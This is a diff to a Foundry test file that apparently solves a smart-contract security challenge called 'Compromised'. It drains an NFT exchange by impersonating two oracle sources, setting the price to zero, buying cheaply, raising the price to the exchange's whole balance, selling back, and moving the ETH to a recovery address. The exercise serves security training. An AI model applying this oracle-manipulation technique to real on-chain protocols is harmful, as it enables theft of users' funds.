@@ -74,8 +74,41 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {
-        
+    function test_compromised() public checkSolved{
+        // set low price
+        // buy nft
+        // set high price
+        // sell nft
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], 0 wei);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], 0 wei);
+        vm.stopPrank();
+
+        console.log(oracle.getMedianPrice(symbols[0]), "******");
+
+        vm.startPrank(player);
+        uint256 id = exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0], EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0], EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        console.log(oracle.getMedianPrice(symbols[0]), "******");
+
+        vm.startPrank(player);
+        nft.approve(address(exchange), id);
+        exchange.sellOne(id);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
     }
 
     /**
